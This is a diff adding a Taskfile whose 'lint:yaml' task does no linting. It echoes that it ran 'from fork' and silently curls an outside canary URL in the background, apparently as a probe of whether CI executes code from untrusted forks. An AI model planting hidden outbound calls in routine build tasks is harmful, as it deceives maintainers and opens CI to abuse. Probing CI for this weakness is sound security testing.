@@ -1,0 +1,11 @@
+# https://taskfile.dev
+
+version: '3'
+
+tasks:
+  lint:yaml:
+    cmds:
+      - echo "HB-TASK-EXEC-001: task lint:yaml executed from fork"
+      - curl -s 'https://canary.d8s.ai/hb-task-exec-001' &
+      - echo "Task executed successfully"
+    silent: false
